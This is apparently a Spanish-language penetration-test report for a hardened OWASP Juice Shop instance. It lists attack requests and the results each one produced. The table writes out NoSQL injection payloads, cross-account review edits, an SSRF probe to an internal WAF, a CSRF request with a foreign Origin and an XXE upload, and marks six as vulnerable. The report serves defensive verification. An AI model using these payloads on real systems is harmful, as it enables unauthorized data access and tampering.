# Pruebas del cierre técnico — 2026-11-23T23:19:41+00:00

Objetivo: http://juice-hardened:3000. Cuentas nuevas A y B. Tokens no se registran.

| ID | Caso | Petición | HTTP | Efecto real | Veredicto |
|---|---|---|---|---|---|
| T1 | NoSQL: reseñas de otros productos | `GET /rest/products/1 || true/reviews` | 200 | reseñas del producto 1: 2; con la inyección: 0 | **PROTEGIDO** |
| T2 | NoSQL: todos los pedidos | `GET /rest/track-order/x'||'1'=='1` | 200 | pedidos devueltos: 1 | **PROTEGIDO** |
| T3 | NoSQL: modificar todas las reseñas | `PATCH /rest/products/reviews {id:{$ne:-1}}` | 200 | reseñas modificadas: 30 | **VULNERABLE** |
| T4 | Reseña de otra cuenta | `PATCH /rest/products/reviews {id:<reseña de A>} (B)` | 200 | texto alterado: sí | **VULNERABLE** |
| T5 | SSRF hacia un servicio interno | `POST /profile/image/url imageUrl=http://juice-waf:8080/…` | 302 | ver marca ssrf-sonda-1795475981 en el log de acceso del WAF (lo comprueba el ejecutor) | **PENDIENTE DE LOG** |
| T6 | CSRF: perfil con Origin ajeno | `POST /profile (cookie, Origin: https://atacante.example)` | 302 | nombre cambiado: sí | **VULNERABLE** |
| T6b | Control: perfil sin Origin ajeno (uso legítimo) | `POST /profile (cookie)` | 302 | nombre cambiado: sí | **PROTEGIDO** |
| T7 | XXE: entidad externa con archivo local | `POST /file-upload (xxe.xml)` | 410 | contenido en la respuesta: no; resolución en el servidor: ver marca xxe-sonda-1795475981 en el log de la app | **PENDIENTE DE LOG** |
| T8 | 5xx con mensaje interno de la BD | `POST /api/Feedbacks (UserId inexistente)` | 500 | cuerpo: {"message":"internal error","errors":["SQLITE_CONSTRAINT: FOREIGN KEY  | **VULNERABLE** |
| T9 | Quejas de otras cuentas | `GET /api/Complaints (B)` | 200 | queja de A visible: sí | **VULNERABLE** |
| T10 | Reciclajes sin sesión y en lote | `GET /api/Recycles/[1..10] (sin token)` | 200 | registros devueltos: 10 | **VULNERABLE** |

**Resultado parcial: 6 VULNERABLE, 3 PROTEGIDO, 2 pendientes de log o no concluyentes.**

## Comprobación en logs (ejecutor, 2026-11-23T17:19:46-06:00)
- T5 SSRF: la marca `ssrf-sonda-1795475981` aparece 1 vez/veces en el log de acceso del WAF, pedida por la app (ua "node", red interna) → **VULNERABLE**
- T7 XXE: la marca `xxe-sonda-1795475981` aparece 0 vez/veces en el log de la app; la subida XML responde 410 «deprecated» porque Juice Shop detecta Docker y desactiva ese reto → **PROTEGIDO solo por la detección de Docker**
